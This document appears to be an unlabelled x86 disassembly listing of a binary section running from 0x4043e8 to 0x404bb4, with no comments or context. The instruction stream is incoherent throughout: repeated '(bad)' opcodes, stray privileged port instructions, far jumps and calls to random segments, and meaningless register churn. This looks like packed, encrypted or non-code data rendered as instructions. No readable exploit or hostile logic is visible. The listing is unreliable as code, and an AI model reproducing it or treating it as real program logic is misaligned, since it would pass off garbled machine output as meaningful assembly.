  4043e8:	out    0x5f,eax
  4043ea:	arpl   WORD PTR [esi+0x7c],ax
  4043ed:	mov    cl,0x76
  4043ef:	loopne 0x404389
  4043f1:	pusha  
  4043f2:	cs mov dh,0x46
  4043f5:	push   edi
  4043f6:	push   edx
  4043f7:	iret   
  4043f8:	xchg   ecx,eax
  4043f9:	sub    eax,0x76c65cab
  4043fe:	fwait
  4043ff:	mov    bl,0xdc
  404401:	mov    ebp,0x96538b67
  404406:	std    
  404407:	shl    dl,1
  404409:	inc    ecx
  40440a:	in     eax,0xf6
  40440c:	cmp    eax,0x2fcffee8
  404411:	mov    edx,0x9cd43d1f
  404416:	xchg   ebp,eax
  404417:	mov    al,0x2d
  404419:	popa   
  40441a:	pop    ds
  40441b:	js     0x40443a
  40441d:	adc    BYTE PTR [esi+0x1],al
  404420:	test   ecx,edx
  404422:	adc    BYTE PTR [ebp+edi*1+0xb],0x74
  404427:	popf   
  404428:	fucompp 
  40442a:	je     0x4043e7
  40442c:	push   ss
  40442d:	and    DWORD PTR [ebp+0x4167ce55],edx
  404433:	jo     0x4043fb
  404435:	dec    ebx
  404436:	jmp    0x404443
  404438:	loope  0x404414
  40443a:	stos   BYTE PTR es:[edi],al
  40443b:	call   0xaa819003
  404440:	addr16 jp 0x404424
  404443:	adc    DWORD PTR [edx-0x7e049273],esp
  404449:	in     al,dx
  40444a:	xor    bh,BYTE PTR [ebx-0x7e675947]
  404450:	hlt    
  404451:	imul   ecx,ecx,0x56
  404454:	pop    esp
  404455:	cmp    al,0x9b
  404457:	stos   BYTE PTR es:[edi],al
  404458:	inc    ebx
  404459:	push   esi
  40445a:	int3   
  40445b:	fcmovu st,st(2)
  40445d:	pop    ebx
  40445e:	pop    ss
  40445f:	cld    
  404460:	pop    ss
  404461:	push   0x49
  404463:	and    BYTE PTR cs:[edi-0x79],ah
  404467:	rcl    BYTE PTR [edi],0x8d
  40446a:	cmc    
  40446b:	adc    al,0xd2
  40446d:	mov    eax,ds:0xc631776
  404472:	jp     0x40445d
  404474:	pop    ebp
  404475:	test   BYTE PTR [edx-0x4f],bl
  404478:	clc    
  404479:	xor    ah,cl
  40447b:	mov    ecx,0x1feed47e
  404480:	inc    edi
  404481:	test   dl,bl
  404483:	gs jae 0x4044b6
  404486:	mov    ebp,0xf35d7d15
  40448b:	xchg   ebx,eax
  40448c:	and    dh,BYTE PTR [edx-0x34a164d3]
  404492:	cmc    
  404493:	ins    DWORD PTR es:[edi],dx
  404494:	test   BYTE PTR [edi+0x2de61da2],ah
  40449a:	sbb    BYTE PTR [edx],dl
  40449c:	mov    al,0xb6
  40449e:	scas   al,BYTE PTR es:[edi]
  40449f:	call   0x4a31:0xe5670ea8
  4044a6:	add    ecx,DWORD PTR [edx-0x5c81aeec]
  4044ac:	dec    ebx
  4044ad:	nop
  4044ae:	rcr    ch,0x90
  4044b1:	(bad)  
  4044b2:	loopne 0x4044e3
  4044b4:	js     0x404491
  4044b6:	clc    
  4044b7:	dec    ebp
  4044b8:	data16 mov ds:0xa08dcd5c,al
  4044be:	and    eax,0xbaac076f
  4044c3:	mov    bl,0xe4
  4044c5:	inc    ebp
  4044c6:	jge    0x404496
  4044c8:	cmp    BYTE PTR [eax+edi*8-0x64201feb],ah
  4044cf:	inc    eax
  4044d0:	stos   DWORD PTR es:[edi],eax
  4044d1:	imul   ebx,DWORD PTR [edi],0x383df88d
  4044d7:	lea    eax,[ebx]
  4044d9:	mov    ah,0x91
  4044db:	jle    0x4044e8
  4044dd:	dec    eax
  4044de:	aad    0x6f
  4044e0:	inc    esp
  4044e1:	(bad)  
  4044e2:	adc    ecx,edi
  4044e4:	test   al,0xd7
  4044e6:	jno    0x404482
  4044e8:	aas    
  4044e9:	cmp    bh,bh
  4044eb:	xor    BYTE PTR ds:0xb37805bb,0xbe
  4044f2:	mov    eax,0xe2257583
  4044f7:	cmp    eax,DWORD PTR [ebx+0x3ba8ca16]
  4044fd:	jecxz  0x40452d
  4044ff:	pop    ss
  404500:	or     esp,DWORD PTR [edi-0x5064e620]
  404506:	pop    ebx
  404507:	aad    0xe
  404509:	xchg   esp,eax
  40450a:	lock lahf 
  40450c:	(bad)  
  40450e:	xchg   esi,eax
  40450f:	push   ebp
  404510:	stos   BYTE PTR es:[edi],al
  404511:	pop    es
  404512:	mov    dh,0x73
  404514:	add    ah,bh
  404516:	and    al,0x7d
  404518:	test   BYTE PTR [esi+0x2d],dl
  40451b:	iret   
  40451c:	inc    edi
  40451d:	adc    BYTE PTR [esi+0xf6e9e53],0x6
  404524:	mov    al,ds:0x7d73871f
  404529:	inc    ebx
  40452a:	retf   0x14e3
  40452d:	sub    al,0xf5
  40452f:	sub    eax,0x2c062414
  404534:	jg     0x404588
  404536:	xchg   esp,eax
  404537:	pop    edi
  404538:	adc    ch,BYTE PTR [edx-0x2243ab1c]
  40453e:	ins    BYTE PTR es:[edi],dx
  40453f:	xchg   BYTE PTR [ebp-0x63a4e332],dh
  404545:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404546:	xlat   BYTE PTR ds:[ebx]
  404547:	sahf   
  404548:	in     al,0x6b
  40454a:	and    al,0x5
  40454c:	rcl    ch,1
  40454e:	jo     0x404540
  404550:	jecxz  0x404569
  404552:	iret   
  404553:	dec    eax
  404554:	fucomp st(3)
  404556:	cmp    esp,DWORD PTR ds:0xbf5e3304
  40455c:	cmp    bl,BYTE PTR [edi]
  40455e:	pusha  
  40455f:	add    DWORD PTR fs:[ecx+eax*2],edx
  404563:	pop    esi
  404564:	aad    0xca
  404566:	pop    esi
  404567:	push   eax
  404568:	fiadd  DWORD PTR [edx-0x731d127]
  40456e:	dec    esp
  40456f:	jle    0x404584
  404571:	mov    ebx,0xb3613b47
  404576:	leave  
  404577:	loopne 0x404506
  404579:	and    ebx,DWORD PTR [edi-0x54]
  40457c:	ss sub edx,0xffffffe3
  404580:	mov    al,ds:0x777f54d0
  404585:	scas   al,BYTE PTR es:[edi]
  404586:	loope  0x4045fb
  404588:	dec    ebx
  404589:	fld    st(2)
  40458b:	or     al,0xba
  40458d:	jp     0x40458d
  40458f:	mov    ch,BYTE PTR [ecx*1+0x18581a29]
  404596:	les    esi,FWORD PTR [ecx-0x15262115]
  40459c:	and    eax,0x3c9cb1cf
  4045a1:	imul   ebp,DWORD PTR [ecx],0x9ffc7e05
  4045a7:	imul   ebp,DWORD PTR [ebx-0x109b4509],0xffffffe8
  4045ae:	mov    edi,0x546a96c1
  4045b3:	shl    DWORD PTR [ebp+0x6d],1
  4045b6:	lods   eax,DWORD PTR ds:[esi]
  4045b7:	das    
  4045b8:	add    bh,bl
  4045ba:	dec    edx
  4045bb:	pop    eax
  4045bc:	out    0x70,eax
  4045be:	push   esp
  4045bf:	add    bh,BYTE PTR [eax+0xb]
  4045c2:	fdiv   QWORD PTR [eax-0x1d]
  4045c5:	push   ecx
  4045c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4045c7:	xchg   edx,eax
  4045c8:	add    ebx,DWORD PTR [esi]
  4045ca:	sahf   
  4045cb:	mov    BYTE PTR ds:0x20c03b18,dl
  4045d1:	inc    edx
  4045d2:	(bad)  
  4045d3:	aam    0xc4
  4045d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045d6:	dec    eax
  4045d7:	les    esi,FWORD PTR [ebx-0x478ff34]
  4045dd:	(bad)  
  4045de:	out    0x47,eax
  4045e0:	mov    bl,0x8d
  4045e2:	hlt    
  4045e3:	stos   DWORD PTR es:[edi],eax
  4045e4:	mov    ecx,0x224a0c3b
  4045e9:	jns    0x40456f
  4045eb:	pushf  
  4045ec:	xor    al,0xc9
  4045ee:	cmp    al,0x97
  4045f0:	scas   eax,DWORD PTR es:[edi]
  4045f1:	(bad)  
  4045f2:	retf   0x90b
  4045f5:	cmp    al,0x30
  4045f7:	in     al,dx
  4045f8:	data16 out dx,al
  4045fa:	xlat   BYTE PTR ds:[ebx]
  4045fb:	test   al,0x7
  4045fd:	push   ebx
  4045fe:	shl    BYTE PTR [edx+edi*1],0x25
  404602:	dec    ebx
  404603:	xchg   ebp,eax
  404604:	icebp  
  404605:	fstp   TBYTE PTR [edx-0x22]
  404608:	fwait
  404609:	nop
  40460a:	mov    eax,ds:0x9dc919ab
  40460f:	pushf  
  404610:	fistp  QWORD PTR [ebx+ebp*1-0x26]
  404614:	fcmovne st,st(2)
  404616:	arpl   WORD PTR [ebx+0x523fa9b8],sp
  40461c:	inc    ebx
  40461d:	xchg   ebx,eax
  40461e:	imul   ecx,DWORD PTR [esi-0x2b],0x388712a2
  404625:	(bad)  
  404626:	shl    ecx,cl
  404628:	add    cl,0xe6
  40462b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40462c:	stos   DWORD PTR es:[edi],eax
  40462d:	xor    eax,0xd1938f1a
  404632:	cmp    ebx,DWORD PTR [eax+0xc]
  404635:	in     al,0xa6
  404637:	test   BYTE PTR [esi*1-0x7e23ff95],0x26
  40463f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404640:	adc    DWORD PTR [esp+0x28],esi
  404644:	lods   al,BYTE PTR ds:[esi]
  404645:	and    BYTE PTR [edi],ah
  404647:	jne    0x4045ca
  404649:	inc    ebp
  40464a:	fisub  DWORD PTR [edi+0x3c]
  40464d:	sub    DWORD PTR [ebx+0x6490d801],ebp
  404653:	imul   ecx,esi,0xa6561eef
  404659:	ret    
  40465a:	adc    BYTE PTR ds:0x530a0f0d,0x98
  404661:	ins    DWORD PTR es:[edi],dx
  404662:	push   eax
  404663:	add    DWORD PTR ds:0xda3068e6,esp
  404669:	cmp    eax,0xf94ed677
  40466e:	push   ebx
  40466f:	scas   eax,DWORD PTR es:[edi]
  404670:	addr16 xchg edx,eax
  404672:	or     ch,bh
  404674:	xor    esi,ebp
  404676:	mov    dl,0x4d
  404678:	mov    al,ds:0x7aeed2be
  40467d:	dec    edi
  40467e:	scas   al,BYTE PTR es:[edi]
  40467f:	pop    ecx
  404680:	mov    eax,0x8d6bc6b5
  404685:	xor    DWORD PTR [eax-0x37],ecx
  404688:	idiv   DWORD PTR [eax+0x35]
  40468b:	mov    al,dl
  40468d:	out    0x21,al
  40468f:	fdivr  st(0),st
  404691:	add    DWORD PTR [edx+0x9],esp
  404694:	cmp    al,BYTE PTR [edi+0x3aa71566]
  40469a:	pop    es
  40469b:	jns    0x404637
  40469d:	arpl   WORD PTR [ecx],di
  40469f:	fdiv   DWORD PTR [eax]
  4046a1:	or     BYTE PTR [ebx],0xfb
  4046a4:	sbb    BYTE PTR [edi],al
  4046a6:	pop    ebx
  4046a7:	jp     0x404664
  4046a9:	add    BYTE PTR [ecx-0x48951cbc],bh
  4046af:	ss jnp 0x404675
  4046b2:	or     BYTE PTR es:[ebp+0x3bcdce86],ch
  4046b9:	adc    DWORD PTR [edx],ecx
  4046bb:	jmp    0x3543242c
  4046c0:	mov    ebp,0x3ac94d10
  4046c5:	sbb    al,dh
  4046c7:	lods   eax,DWORD PTR ds:[esi]
  4046c8:	in     eax,dx
  4046c9:	or     al,0xf2
  4046cb:	mov    ds:0xc931e556,eax
  4046d0:	inc    ebp
  4046d1:	xor    BYTE PTR [ecx+0x6126cd5f],dl
  4046d7:	fdivr  DWORD PTR [edx+0x33]
  4046da:	in     al,dx
  4046db:	outs   dx,DWORD PTR ds:[esi]
  4046dc:	jmp    0xaa9a:0xc3306f49
  4046e3:	mov    esp,0xc2aacbd0
  4046e8:	lods   eax,DWORD PTR ds:[esi]
  4046e9:	push   esi
  4046ea:	xor    esi,ebx
  4046ec:	or     eax,0x957fa123
  4046f1:	lahf   
  4046f2:	ja     0x4046d9
  4046f4:	test   BYTE PTR ds:0x5341367d,ah
  4046fa:	leave  
  4046fb:	popf   
  4046fc:	in     eax,dx
  4046fd:	imul   edi,eax,0x612f0f97
  404703:	popf   
  404704:	cmp    ah,ah
  404706:	(bad)  
  404707:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404708:	mov    ebx,0x3f195766
  40470d:	mov    al,ds:0x4486724d
  404712:	lods   al,BYTE PTR ds:[esi]
  404713:	cmp    bl,ah
  404715:	fadd   DWORD PTR ds:0x4f59a122
  40471b:	out    dx,eax
  40471c:	lahf   
  40471d:	cmc    
  40471e:	popf   
  40471f:	popa   
  404720:	add    eax,0x1750332a
  404725:	out    dx,eax
  404726:	add    BYTE PTR [eax],0xaa
  404729:	(bad)  
  40472a:	loop   0x404730
  40472c:	push   0x4e03fa05
  404731:	sub    dh,bl
  404733:	(bad)  
  404734:	mov    ch,0x5d
  404736:	adc    al,0xc0
  404738:	cmp    bh,cl
  40473a:	leave  
  40473b:	jmp    0xd81:0x2d1ac0f
  404742:	push   ebx
  404743:	add    BYTE PTR [edx+0x0],0xf
  404747:	add    BYTE PTR [edx+0x0],0xc1
  40474b:	jmp    0x4282:0x2f158b02
  404752:	add    BYTE PTR [ecx],cl
  404754:	adc    eax,0x42832f
  404759:	mov    DWORD PTR [ebp-0x1c],ecx
  40475c:	jmp    0x404b3a
  404761:	add    al,0x2a
  404763:	lea    edi,[eax+0x1a]
  404766:	fcomp  QWORD PTR ss:[edx]
  404769:	pop    edi
  40476a:	or     al,0x3f
  40476c:	mov    esi,0xbe3f7dc9
  404771:	fcmovnb st,st(7)
  404773:	sbb    BYTE PTR [eax],bl
  404775:	sahf   
  404776:	adc    bl,BYTE PTR [eax]
  404778:	sbb    BYTE PTR [eax],al
  40477a:	int3   
  40477b:	mov    dl,0xf6
  40477d:	add    dl,BYTE PTR [edx]
  40477f:	sub    cl,bl
  404781:	call   0x47f7:0x6b95fcca
  404788:	xor    al,0xa2
  40478a:	leave  
  40478b:	jb     0x40478d
  40478d:	inc    edi
  40478e:	(bad)  
  40478f:	jmp    0xcfcd:0x7adf2e0e
  404796:	iret   
  404797:	rcr    DWORD PTR [edx],0x36
  40479a:	mov    eax,0x40f3d1be
  40479f:	push   esi
  4047a0:	(bad)  
  4047a1:	adc    al,0xcc
  4047a3:	loopne 0x404800
  4047a5:	cli    
  4047a6:	inc    ebp
  4047a7:	repz pushw ss
  4047aa:	arpl   WORD PTR [eax],di
  4047ac:	bsf    esp,DWORD PTR [ebx+0x7]
  4047b0:	adc    DWORD PTR [ebx+0x3091fb2b],eax
  4047b6:	retf   0x7ce4
  4047b9:	cwde   
  4047ba:	js     0x4047ab
  4047bc:	sub    bl,BYTE PTR [edx-0x483e3b91]
  4047c2:	out    0xda,eax
  4047c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4047c5:	cmp    eax,0x5fdb7d0d
  4047ca:	fstp   DWORD PTR [edi]
  4047cc:	lea    esi,cs:[ebp-0x20a83d2d]
  4047d3:	and    ah,cl
  4047d5:	mov    dl,0x8b
  4047d7:	mov    edx,0xf2ef19ab
  4047dc:	scas   al,BYTE PTR es:[edi]
  4047dd:	cmp    eax,0xe9e03a07
  4047e2:	jecxz  0x40478a
  4047e4:	ja     0x404832
  4047e6:	push   edx
  4047e7:	(bad)  
  4047e9:	cmp    DWORD PTR gs:[ecx+0x34350022],edi
  4047f0:	cli    
  4047f1:	mov    ds,WORD PTR [ebx+0x2a03782e]
  4047f7:	enter  0x8340,0xe7
  4047fb:	inc    eax
  4047fc:	mov    bl,0xb7
  4047fe:	mov    BYTE PTR [eax+ecx*4-0x45],bl
  404802:	adc    al,0x8b
  404804:	mov    esi,0x7ebfed34
  404809:	xchg   esi,eax
  40480a:	pop    esp
  40480b:	mov    dh,0x40
  40480d:	sbb    DWORD PTR [esi+0x395fd251],0x26
  404814:	xchg   esp,eax
  404815:	push   ss
  404816:	out    0x4f,eax
  404818:	jecxz  0x404873
  40481a:	mov    BYTE PTR [ecx-0x36e0bcdb],al
  404820:	in     al,0xb3
  404822:	in     eax,0x9a
  404824:	mov    WORD PTR [eax+edx*8],ss
  404827:	push   ss
  404828:	push   0x1d
  40482a:	xchg   ecx,eax
  40482b:	neg    cl
  40482d:	repnz mov BYTE PTR ds:0x28f28670,dl
  404834:	dec    DWORD PTR [edx-0xe3e8e9b]
  40483a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40483b:	repz jne 0x4048bd
  40483e:	loope  0x4047cc
  404840:	scas   eax,DWORD PTR es:[edi]
  404841:	mov    bl,0xd8
  404843:	pop    edx
  404844:	lock mov eax,ds:0x5d2fe26
  40484a:	rol    bl,0xf
  40484d:	push   es
  40484e:	ja     0x40486e
  404850:	es jmp 0xb6bd:0xb4dd87ca
  404858:	xchg   esi,eax
  404859:	adc    dh,ch
  40485b:	sbb    dl,0xb9
  40485e:	das    
  40485f:	in     al,0x83
  404861:	popa   
  404862:	(bad)  [edx+0x1f]
  404865:	sub    bl,BYTE PTR [eax+0x2014efa1]
  40486b:	ins    BYTE PTR es:[edi],dx
  40486c:	jl     0x404839
  40486e:	pop    ebp
  40486f:	and    DWORD PTR [ebp+0x649cc783],edx
  404875:	pop    ebp
  404876:	ss sbb al,0x15
  404879:	pop    edi
  40487a:	mov    ebx,0x5e4f6fda
  40487f:	dec    edx
  404880:	xchg   ebx,eax
  404881:	enter  0x97bc,0x27
  404885:	(bad)  [ebx+0x3e079bf2]
  40488b:	pop    edx
  40488c:	jle    0x4048dc
  40488e:	hlt    
  40488f:	or     dh,BYTE PTR [ebp+0x6d7b620f]
  404895:	ret    0x9c83
  404898:	push   eax
  404899:	call   0x5118:0xd0b9048c
  4048a0:	ret    0x4d46
  4048a3:	mov    esi,0x712bfac2
  4048a8:	mov    ds:0xd745cd9f,eax
  4048ad:	sbb    DWORD PTR [edx],esi
  4048af:	and    bl,bl
  4048b1:	mov    ecx,0xeb32d767
  4048b6:	push   edx
  4048b7:	sahf   
  4048b8:	adc    DWORD PTR [ebp-0x8],eax
  4048bb:	ins    BYTE PTR es:[edi],dx
  4048bc:	jo     0x4048e1
  4048be:	lds    ecx,FWORD PTR [ebp+0x49a4fc6b]
  4048c4:	dec    ebx
  4048c5:	sbb    DWORD PTR [esi-0x501758b5],edx
  4048cb:	pop    edi
  4048cc:	push   es
  4048cd:	pop    ds
  4048ce:	icebp  
  4048cf:	push   ebx
  4048d0:	hlt    
  4048d1:	add    esi,eax
  4048d3:	jge    0x404862
  4048d5:	inc    ebx
  4048d6:	sbb    cl,dl
  4048d8:	or     DWORD PTR [ecx+edi*4],0x33efc3ca
  4048df:	test   DWORD PTR [ebp+0x30],edi
  4048e2:	pop    edi
  4048e3:	dec    ebx
  4048e4:	mov    bl,0x93
  4048e6:	add    esp,ebx
  4048e8:	(bad)  
  4048e9:	jno    0x4048f3
  4048eb:	jp     0x4048a5
  4048ed:	xor    DWORD PTR [edx-0x58],eax
  4048f0:	pop    edi
  4048f1:	shl    DWORD PTR [esp+ebp*2+0x55],cl
  4048f5:	inc    ecx
  4048f6:	fldcw  WORD PTR [edx]
  4048f8:	add    DWORD PTR [edi+0x7f22dfeb],0x16
  4048ff:	push   ds
  404900:	pop    ecx
  404901:	xor    al,0x7f
  404903:	jle    0x404968
  404905:	jno    0x40490b
  404907:	add    BYTE PTR ds:0x6fdb5c9a,0xe0
  40490e:	pop    edx
  40490f:	(bad)
  404913:	jne    0x4048fb
  404915:	xor    BYTE PTR [ecx],0x87
  404918:	or     eax,0xeaee5440
  40491d:	cmovne esi,DWORD PTR [eax+0x12d72863]
  404924:	xor    DWORD PTR [edx-0x3e],0xd32611d8
  40492b:	mov    dh,0xee
  40492d:	gs (bad) 
  40492f:	sar    DWORD PTR [ebp-0x8687fcf],1
  404935:	retf   0xf2d9
  404938:	gs push eax
  40493a:	adc    BYTE PTR [ebx+0x39],dl
  40493d:	sbb    eax,0xddf2f557
  404942:	es pushf 
  404944:	and    ebx,DWORD PTR [ebp-0x7]
  404947:	div    DWORD PTR [ecx]
  404949:	xchg   ecx,eax
  40494a:	xlat   BYTE PTR ds:[ebx]
  40494b:	push   esp
  40494c:	push   edi
  40494d:	xchg   ebp,eax
  40494e:	lahf   
  40494f:	dec    bp
  404951:	cmp    DWORD PTR [eax-0x6f70b84b],ebp
  404957:	fstp   TBYTE PTR [esi]
  404959:	dec    esi
  40495a:	arpl   di,dx
  40495c:	ja     0x404900
  40495e:	dec    eax
  40495f:	stc    
  404960:	push   esi
  404961:	sbb    DWORD PTR [ecx],ebp
  404963:	dec    edi
  404964:	lds    edx,FWORD PTR [ebx]
  404966:	sub    bl,dh
  404968:	pop    esp
  404969:	ds jbe 0x404948
  40496c:	cld    
  40496d:	xchg   DWORD PTR [ecx+edx*4+0x5d39f536],edi
  404974:	inc    edi
  404975:	(bad)  
  404976:	sub    DWORD PTR [ecx],edi
  404978:	or     esp,DWORD PTR [edx+0x7e]
  40497b:	adc    al,0xa2
  40497d:	test   BYTE PTR [edx-0x69],al
  404980:	bound  ebx,QWORD PTR [edi+0xf2a5204]
  404986:	push   0xcf32fd3f
  40498b:	ja     0x40497f
  40498d:	push   ebx
  40498e:	stos   DWORD PTR es:[edi],eax
  40498f:	mov    esp,0xf841a5ed
  404994:	jecxz  0x4049fe
  404996:	mov    eax,ds:0x46dc3354
  40499b:	fdecstp 
  40499d:	punpckldq mm6,mm6
  4049a0:	arpl   WORD PTR [edi+ebp*1+0x45],bx
  4049a4:	and    al,0xde
  4049a6:	and    BYTE PTR [ecx],al
  4049a8:	xchg   ecx,eax
  4049a9:	test   al,0x61
  4049ab:	and    BYTE PTR [eax],bl
  4049ad:	repnz pop ebx
  4049af:	sub    BYTE PTR [esi-0x43],al
  4049b2:	xchg   esp,eax
  4049b3:	arpl   WORD PTR ss:[esi],ax
  4049b6:	arpl   WORD PTR [ebp+ebx*1+0x9],cx
  4049ba:	divps  xmm5,XMMWORD PTR [eax]
  4049bd:	ret    0x985f
  4049c0:	ja     0x404969
  4049c2:	retf   
  4049c3:	mov    ah,0x91
  4049c5:	xchg   DWORD PTR [esi-0x5b],esi
  4049c8:	sbb    bl,cl
  4049ca:	mov    ds:0x5ed98e5b,eax
  4049cf:	iret   
  4049d0:	pop    esp
  4049d1:	clc    
  4049d2:	je     0x404989
  4049d4:	push   edx
  4049d5:	sahf   
  4049d6:	mov    esp,0xdfd2d4d0
  4049db:	jns    0x404a3d
  4049dd:	test   DWORD PTR [esp+edx*2],ecx
  4049e0:	test   al,0x2
  4049e2:	mov    edx,0x3e59afbc
  4049e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4049e8:	lahf   
  4049e9:	sub    al,BYTE PTR [ebp-0x7ff2daca]
  4049ef:	ja     0x404a33
  4049f1:	aas    
  4049f2:	push   ecx
  4049f3:	push   esi
  4049f4:	cwde   
  4049f5:	pop    esp
  4049f6:	jo     0x4049e2
  4049f8:	dec    ebx
  4049f9:	push   0xffffffed
  4049fb:	xor    eax,0x8d2ad153
  404a00:	and    DWORD PTR [ebp-0x3fa81c39],esp
  404a06:	add    al,0x16
  404a08:	fsubr  QWORD PTR [ebp+0x7299896d]
  404a0e:	daa    
  404a0f:	loopne 0x40499e
  404a11:	mov    edx,0x8b854eec
  404a16:	aaa    
  404a17:	into   
  404a18:	push   ebp
  404a19:	(bad)  
  404a1a:	lds    ecx,FWORD PTR [ebx+eiz*4+0x54538b40]
  404a21:	out    0xa6,al
  404a23:	jmp    0x404a89
  404a25:	or     ebx,esi
  404a27:	lahf   
  404a28:	inc    edi
  404a29:	pop    ebp
  404a2a:	repz arpl WORD PTR [ecx],di
  404a2d:	xor    edi,esp
  404a2f:	push   ss
  404a30:	add    dh,BYTE PTR [eax+0x74d816f]
  404a36:	inc    esi
  404a37:	jecxz  0x404a62
  404a39:	shl    DWORD PTR [ebp+0x33e21c53],0xd5
  404a40:	je     0x404a71
  404a42:	mov    fs,WORD PTR [ebx-0x67c80137]
  404a48:	push   edi
  404a49:	mov    al,0xcf
  404a4b:	pop    es
  404a4c:	retf   
  404a4d:	cdq    
  404a4e:	sar    BYTE PTR [eax],cl
  404a50:	sub    ebp,0x517cd76e
  404a56:	mov    dh,0x80
  404a58:	loope  0x404a71
  404a5a:	mov    edi,0x23b57dd7
  404a5f:	push   es
  404a60:	call   0xb34b:0x8269b8b5
  404a67:	popf   
  404a68:	sar    DWORD PTR [edi+0x30],cl
  404a6b:	lods   eax,DWORD PTR ds:[esi]
  404a6c:	dec    edi
  404a6d:	outs   dx,BYTE PTR ds:[esi]
  404a6e:	add    ebp,ecx
  404a70:	sahf   
  404a71:	xchg   edi,eax
  404a72:	fidivr DWORD PTR [esi]
  404a74:	into   
  404a75:	cdq    
  404a76:	pop    esi
  404a77:	and    BYTE PTR [edx],ch
  404a79:	push   ebp
  404a7a:	pop    ds
  404a7b:	mov    bl,0x2d
  404a7d:	test   DWORD PTR [eax-0x49],edi
  404a80:	pop    es
  404a81:	or     esp,DWORD PTR ss:[ecx+ebp*2-0x6b]
  404a86:	in     eax,0xd
  404a88:	dec    ecx
  404a89:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a8a:	or     bh,BYTE PTR [ebx-0x19]
  404a8d:	fisttp QWORD PTR [edi]
  404a8f:	dec    esp
  404a90:	sub    BYTE PTR [edi+eiz*8-0x195331a8],al
  404a97:	(bad)  
  404a98:	sti    
  404a99:	in     eax,0xf6
  404a9b:	leave  
  404a9c:	call   0xf423:0xd80e711b
  404aa3:	mov    dl,0xca
  404aa5:	jp     0x404b1a
  404aa7:	arpl   WORD PTR [eax],cx
  404aa9:	dec    eax
  404aaa:	xlat   BYTE PTR gs:[ebx]
  404aac:	mov    ah,0x11
  404aae:	cmc    
  404aaf:	lods   eax,DWORD PTR ds:[esi]
  404ab0:	push   esi
  404ab1:	add    DWORD PTR [eax+0x1b],0x49
  404ab5:	out    0x8f,eax
  404ab7:	pusha  
  404ab8:	or     edi,ecx
  404aba:	cwde   
  404abb:	mov    ebx,0x55166534
  404ac0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404ac1:	popa   
  404ac2:	push   cs
  404ac3:	mov    BYTE PTR [esi+0x18],dh
  404ac6:	xor    BYTE PTR [ebx-0x31aa1cda],0xc5
  404acd:	repnz dec esp
  404acf:	dec    esp
  404ad0:	add    esp,eax
  404ad2:	sub    eax,DWORD PTR [edx]
  404ad4:	inc    esi
  404ad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404ad6:	push   ebx
  404ad8:	in     eax,0x68
  404ada:	inc    eax
  404adb:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  404add:	pop    edi
  404ade:	dec    eax
  404adf:	xlat   BYTE PTR ds:[ebx]
  404ae0:	icebp  
  404ae1:	jmp    0x404aa0
  404ae3:	xor    bl,bl
  404ae5:	fild   DWORD PTR [ebp+0x6f48b47c]
  404aeb:	addr16 sbb ebx,esi
  404aee:	add    BYTE PTR gs:[eax-0x15],dl
  404af2:	dec    eax
  404af3:	int    0xc6
  404af5:	cwde   
  404af6:	mov    cl,0x36
  404af8:	cmp    BYTE PTR [eax-0x8],cl
  404afb:	aad    0x8f
  404afd:	xchg   ebp,eax
  404afe:	aad    0xce
  404b00:	push   ebx
  404b01:	inc    edx
  404b02:	js     0x404aa5
  404b04:	mov    ebp,0x6514052c
  404b09:	mov    eax,ds:0x7b84a6e3
  404b0e:	pop    ss
  404b0f:	stos   DWORD PTR es:[edi],eax
  404b10:	jb     0x404b16
  404b12:	push   esi
  404b13:	pop    es
  404b14:	jo     0x404b62
  404b16:	imul   ecx,ebx,0x24
  404b19:	je     0x404b30
  404b1b:	into   
  404b1c:	mov    bl,0x8d
  404b1e:	repz (bad)
  404b21:	dec    edi
  404b22:	dec    edx
  404b23:	push   edi
  404b24:	mov    dh,0xe4
  404b26:	and    eax,0xadc15cd8
  404b2b:	cmp    cl,ch
  404b2d:	psubsb mm4,mm4
  404b30:	fimul  WORD PTR [eax+0x7f634dd9]
  404b36:	sub    ch,dl
  404b38:	fistp  DWORD PTR [ebx+0x538b0b8b]
  404b3e:	add    al,0x31
  404b40:	jge    0x404b26
  404b42:	add    DWORD PTR ds:0x428243,0x4282b7
  404b4c:	xor    edx,edx
  404b4e:	jmp    0x404f2c
  404b53:	scas   al,BYTE PTR es:[edi]
  404b54:	ds out dx,al
  404b56:	and    ebx,DWORD PTR [edi+0x22]
  404b59:	sbb    bh,BYTE PTR [edx]
  404b5b:	fsubp  st(5),st
  404b5d:	push   ebx
  404b5e:	stos   BYTE PTR es:[edi],al
  404b5f:	ins    DWORD PTR es:[edi],dx
  404b60:	cli    
  404b61:	mov    ebp,0x18c160b0
  404b66:	sbb    BYTE PTR [esi+0x30181812],bl
  404b6c:	rcr    BYTE PTR [ecx+esi*1+0x65f60eaf],cl
  404b73:	ror    al,1
  404b75:	data16 int 0xb0
  404b78:	nop
  404b79:	lods   al,BYTE PTR ds:[esi]
  404b7a:	mov    bl,0xc4
  404b7c:	out    dx,al
  404b7d:	jnp    0x404b1d
  404b7f:	pushf  
  404b80:	mov    eax,0x3ff5f4c
  404b85:	push   0x2b
  404b87:	fstp   DWORD PTR [edx+0x1d63e4be]
  404b8d:	iret   
  404b8e:	int3   
  404b8f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404b90:	add    bh,BYTE PTR [esi]
  404b92:	pusha  
  404b93:	in     al,dx
  404b94:	or     esp,DWORD PTR [esi+0x7d916a26]
  404b9a:	sar    BYTE PTR [edi-0x6e],1
  404b9d:	popa   
  404b9e:	xchg   ebx,eax
  404b9f:	mov    edi,0xf4206168
  404ba4:	add    ch,dl
  404ba6:	mov    edx,0xdac9b224
  404bab:	pusha  
  404bac:	dec    ebp
  404bad:	popa   
  404bae:	push   ds
  404baf:	add    BYTE PTR [esi],cl
  404bb1:	and    ah,dl
  404bb3:	pop    edx
  404bb4:	pause  
